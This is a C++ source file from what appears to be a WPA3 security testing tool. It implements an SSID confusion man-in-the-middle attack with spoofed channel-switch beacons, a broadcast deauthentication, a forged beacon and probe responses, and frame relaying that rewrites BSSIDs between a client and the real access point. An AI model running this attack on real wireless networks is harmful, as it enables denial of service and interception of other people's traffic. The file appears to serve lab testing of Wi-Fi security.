#include "attacks/mc_mitm/ssid_confusion/ssid_confusion_attack.h"

#include <algorithm>
#include <atomic>
#include <pcap/pcap.h>
#include <thread>

#include "attacks/DoS_soft/channel_switch/channel_switch.h"
#include "attacks/components/setup_connections.h"
#include "attacks/mc_mitm/MonitorSocket.h"
#include "attacks/mc_mitm/wifi_util.h"
#include "config/RunStatus.h"
#include "interrupt.h"
#include "logger/log.h"
#include "observer/dmesg_wrapper.h"
#include "scan/active/scan_AP.h"
#include "system/hw_capabilities.h"
#include "system/utils.h"

using namespace std;
using namespace Tins;
using namespace chrono;

namespace wpa3_tester::ssid_confusion {

static void translate_data_mac(vector<uint8_t>& raw,
							   const HWAddress<6>& from_bssid,
							   const HWAddress<6>& to_bssid) {
	if(raw.size() < 24) return;
	const uint16_t rt_len = static_cast<uint16_t>(raw[2]) | (static_cast<uint16_t>(raw[3]) << 8);

	// Addr1 (DA)
	const uint8_t* addr1 = raw.data() + rt_len + 4;
	if(equal(from_bssid.begin(), from_bssid.end(), addr1))
		ranges::copy(to_bssid, raw.data() + rt_len + 4);

	// Addr3 (BSSID) - POUZE tohle!
	const uint8_t* addr3 = raw.data() + rt_len + 16;
	if(equal(from_bssid.begin(), from_bssid.end(), addr3))
		ranges::copy(to_bssid, raw.data() + rt_len + 16);

	// Addr2 (SA) - NEPŘEPIŠ! Zůstane client_mac
}


// Copy supplicant config + EAP user file (if present); start WrongNet AP + client.
void setup_attack(RunStatus &rs) {
    const auto cfg_dir = rs.config_path().parent_path() / "config";
    for(const auto &f : {"SafeNet_WrongNet.conf", "hostapd.eap_user"}) {
        const auto src = cfg_dir / f;
        if(exists(src)) copy_f(src, rs.run_folder() / f);
    }

    const auto rogue_client = rs.get_actor("rogue_client");
    rogue_client->set_iface_up();
    components::client_ap_setup_t(rs);
}

// Topology: WrongNet AP (ch 11) <-> rogue_client (ch 11) <-> rogue_ap (ch 1, fake SafeNet) <-> client
void run_attack(RunStatus &rs) {
    const auto rogue_ap     = rs.get_actor("rogue_ap");     // injects confused beacons, relays client
    const auto rogue_client = rs.get_actor("rogue_client"); // CSA injection, relays to wrong AP
    const auto ap           = rs.get_actor("ap");           // WrongNet AP
    const auto client       = rs.get_actor("client");

    const auto &att_cfg        = rs.config().at("attack_config");
    const string real_ssid     = ap.get(SK::ssid);          // "WrongNet"
    const string confused_ssid = att_cfg.value("confused_ssid", real_ssid);
    const int    timeout_sec   = att_cfg.value("attack_time_sec", 150);
    const int    beacon_ms     = att_cfg.value("beacon_interval_ms", 100);
    const int    beacon_warn_s = att_cfg.value("beacon_warning_sec", 2);

    rogue_ap->set_iface_up();
    rogue_client->set_iface_up();
    const Channel real_channel  = rogue_client->get_channel();
    const Channel rogue_channel = rogue_ap->get_channel();

    const HWAddress<6> ap_bssid(ap.get(SK::permanent_mac));
    const HWAddress<6> rogue_ap_mac(rogue_ap.get(SK::permanent_mac));
    const HWAddress<6> client_perm(client.get(SK::permanent_mac));

    // Scan for WrongNet beacon on ch 11 — template for CSA + confused beacon
    auto beacon = scan::RSN_scan(
        rogue_client.get(SK::iface), 20,
        ap.get(SK::permanent_mac), nullopt, rogue_client[SK::netns]);
    if(!beacon) throw run_err("'{}' AP not found on ch {}", real_ssid, real_channel.ch_num);
    log(LogLevel::INFO, "Found '{}' AP {} on ch {}", real_ssid, ap.get(SK::mac), real_channel.ch_num);

    // Build confused beacon: rogue_ap_mac BSSID + SafeNet SSID, ch IEs patched to rogue channel.
    // Using rogue_ap_mac avoids wpa_supplicant's 10s ignore-list that fires after CSA disconnect.
    auto confused_beacon = make_confused_beacon(*beacon, confused_ssid, false);
    confused_beacon.addr2(rogue_ap_mac);
    confused_beacon.addr3(rogue_ap_mac);
    if(auto *ch_ie = confused_beacon.search_option(Dot11ManagementFrame::DS_SET))
        const_cast<uint8_t *>(ch_ie->data_ptr())[0] = rogue_channel.ch_num;
    if(auto *ht_ie = confused_beacon.search_option(Dot11ManagementFrame::HT_OPERATION)) {
        if(ht_ie->data_size() >= 1)
            const_cast<uint8_t *>(ht_ie->data_ptr())[0] = rogue_channel.ch_num;
    }

    // BPF: AP + client traffic only
    const string bpf = "(wlan type data or mgt) and (wlan host " + ap.get(SK::permanent_mac) +
        " or wlan host " + client.get(SK::permanent_mac) + ")";

    MonitorSocket sock_real(rogue_client.get(SK::iface), rogue_client[SK::netns]);
    MonitorSocket sock_rogue(rogue_ap.get(SK::iface),    rogue_ap[SK::netns]);
    sock_real.set_filter(bpf);
    sock_rogue.set_filter(bpf);

	const string nic_client_ack = "client_ack_vif";
	const auto &netns = rogue_client[SK::netns];
		Dot11Beacon ack_beacon;
	/*ack_beacon.addr1(HWAddress<6>::broadcast);
	ack_beacon.addr2(HWAddress<6>("12:34:56:78:9a:bc"));
	ack_beacon.addr3(HWAddress<6>("12:34:56:78:9a:bc"));
	ack_beacon.interval(100);

	// Správné nastavení capabilities
	ack_beacon.capabilities().ess(true);   // Infrastructure mode
	ack_beacon.capabilities().privacy(true); // WPA/WPA2 enabled

	// Minimální SSID
	std::string ack_ssid = "__ACK_VIF__";
	ack_beacon.add_option({Dot11::SSID, static_cast<uint8_t>(ack_ssid.size()),
						   reinterpret_cast<const uint8_t*>(ack_ssid.data())});

	// Kanál
	uint8_t ch = real_channel.ch_num;
	ack_beacon.add_option({Dot11ManagementFrame::DS_SET, 1, &ch});

	// Rates
	uint8_t rates[] = {0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24};
	ack_beacon.add_option({Dot11::SUPPORTED_RATES, sizeof(rates), rates});

	//start_ap(rs, nic_client_ack, rogue_client, real_channel, ack_beacon, client_perm);*/

	rogue_client->set_mac_address(client->get(SK::mac));
	start_ap_hostapd(rs, nic_client_ack, rogue_client, real_channel, client_perm);

    rs.start_observers(ObserverRunPolicy::SKIP);
    rs.process_manager.write_log_all(ATTACK_START_tag);

    // Initial CSA burst: spoof WrongNet MAC, push client ch 11 → ch 1
    for(int pass = 0; pass < 3; ++pass) {
        for(int cnt = CSA_attack::CHANNEL_SWITCH_MAX; cnt >= 0; --cnt) {
            RadioTap csa = CSA_attack::get_CSA_beacon(
                ap.get(SK::mac), real_channel, rogue_channel, cnt, beacon.get());
            sock_real.send(csa, real_channel);
            interruptible_sleep(milliseconds(beacon_ms));
        }
    }
    // Broadcast deauth so client re-scans
    Dot11Deauthentication deauth(HWAddress<6>::broadcast, HWAddress<6>(ap_bssid));
    deauth.addr3(HWAddress(ap_bssid));
    deauth.reason_code(3);
    sock_real.send(deauth, real_channel);

    const auto start      = steady_clock::now();
    auto next_beacon      = steady_clock::now();
    auto last_real_beacon = steady_clock::now();
    int  csa_count = CSA_attack::CHANNEL_SWITCH_MAX;

    while(true) {
        if(steady_clock::now() > start + seconds(timeout_sec)) {
            log(LogLevel::INFO, "Attack timeout");
            break;
        }
        //if(only_to_mitm && got_mitm) break;

        const int fd_real  = pcap_get_selectable_fd(sock_real.get_pcap_handle());
        const int fd_rogue = pcap_get_selectable_fd(sock_rogue.get_pcap_handle());
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(fd_real, &fds);
        FD_SET(fd_rogue, &fds);
        const auto us_to_beacon = duration_cast<microseconds>(next_beacon - steady_clock::now()).count();
        timeval tv{ 0, (max<long>(0, min<long>(us_to_beacon, 100'000))) };
        select(max(fd_real, fd_rogue) + 1, &fds, nullptr, nullptr, &tv);

        // ch 11: frames from WrongNet AP → relay to client on ch 1 (translate BSSID)
        if(FD_ISSET(fd_real, &fds)) {
            while(auto r = sock_real.recv()) {
                const auto *dot11 = r.pdu->find_pdu<Dot11>();
                if(!dot11) continue;
                if(dot11->find_pdu<Dot11Beacon>()) {
                    last_real_beacon = steady_clock::now();
                    continue; // don't relay real AP beacons
                }
                const auto [addr1, addr2] = get_addrs(*r.pdu, r.raw);

            	if(addr1 == client_perm || addr2 == ap_bssid || addr1 == ap_bssid) {
            		// This is traffic involving the real AP
            		auto translated = r.raw;
            		translate_data_mac(translated, ap_bssid, rogue_ap_mac);

            		log(LogLevel::DEBUG, "Relay ch11→ch1: SA={} BSSID={}→{}",
            			dot11->addr1().to_string(),
						ap_bssid.to_string(), rogue_ap_mac.to_string());
            		sock_rogue.send(translated, rogue_channel);
            		continue;
            	}
            }
        }

		// ch 1: frames from confused client → relay to WrongNet on ch 11 (translate BSSID back)
		if(FD_ISSET(fd_rogue, &fds)) {
			while(auto r = sock_rogue.recv()) {
				auto *dot11 = r.pdu->find_pdu<Dot11>();
				if(!dot11) continue;
				const auto [addr1, addr2] = get_addrs(*r.pdu, r.raw);

				// Answer probe requests so the client reliably finds SafeNet in active scan
				if(dot11->find_pdu<Dot11ProbeRequest>()) {
					Dot11ProbeResponse resp(addr2, rogue_ap_mac);
					resp.addr3(rogue_ap_mac);
					resp.timestamp(confused_beacon.timestamp());
					resp.interval(confused_beacon.interval());
					resp.capabilities() = confused_beacon.capabilities();
					for(const auto &opt : confused_beacon.options())
						resp.add_option(opt);
					sock_rogue.send(resp, rogue_channel);
					continue;
				}

				// GotMitm: EAPOL M4 or any DATA frame from our client
				const bool eapol4 = is_eapol(*r.pdu) && get_eapol_msg_num(*r.pdu) == 4;
				const bool data   = dot11->type() == Dot11::DATA;
				if((eapol4 || data) && dot11->addr1() == client_perm /*&& !got_mitm*/) {
					log(LogLevel::INFO, "GotMitm: {} connected on ch {} SSID='{}'",
						addr2, rogue_channel.ch_num, confused_ssid);
					//got_mitm = true;
				}


				if(const auto *assoc = dot11->find_pdu<Dot11AssocRequest>()) {
					auto fixed = make_real_ssid_assoc_req(*assoc, real_ssid);  // Přepisuje SSID!
					fixed.addr1(ap_bssid);
					fixed.addr3(ap_bssid);
					sock_real.send(fixed, real_channel);
				}
				else if(const auto *auth = dot11->find_pdu<Dot11Authentication>()) {
					if(auth->auth_algorithm() == 0 && auth->auth_seq_number() == 1) {
						// Open System Auth seq=1 -> seq=2 success
						log(LogLevel::INFO, "Intercepted AuthRequest seq=1, replying with success");

						Dot11Authentication resp(addr2, rogue_ap_mac);
						resp.addr3(rogue_ap_mac);
						resp.auth_seq_number(2);
						resp.auth_algorithm(0);
						resp.status_code(0);

						sock_rogue.send(resp, rogue_channel);

						// Forward to real AP (for ACK VIF)
						auto translated = r.raw;
						translate_data_mac(translated, rogue_ap_mac, ap_bssid);
						sock_real.send(translated, real_channel);
					}
				}else {
					log(LogLevel::DEBUG, "Relaying DATA frame: SA={} DA={}", addr2, addr1);
					auto translated = r.raw;
					translate_data_mac(translated, rogue_ap_mac, ap_bssid);
					sock_real.send(translated, real_channel);
					log(LogLevel::DEBUG, "Sent relayed frame to real AP");
				}
			}
		}

        if(next_beacon <= steady_clock::now()) {
            sock_rogue.send(confused_beacon, rogue_channel);

            //if(!got_mitm) {
                RadioTap csa = CSA_attack::get_CSA_beacon(
                    ap.get(SK::mac), real_channel, rogue_channel, csa_count, beacon.get());
                sock_real.send(csa, real_channel);
                if(--csa_count < 0) csa_count = CSA_attack::CHANNEL_SWITCH_MAX;
            //}
            next_beacon += milliseconds(beacon_ms);
        }

        if(last_real_beacon + seconds(beacon_warn_s) < steady_clock::now()) {
            log(LogLevel::WARNING, "No beacon from WrongNet AP for {}s", beacon_warn_s);
            last_real_beacon = steady_clock::now();
        }
    }
    rs.process_manager.write_log_all(ATTACK_STOP_tag);
	hw_capabilities::run_cmd({ "iw", "dev", nic_client_ack, "del" }, netns, true);
}

void stats_attack(const RunStatus &rs) {

}

}
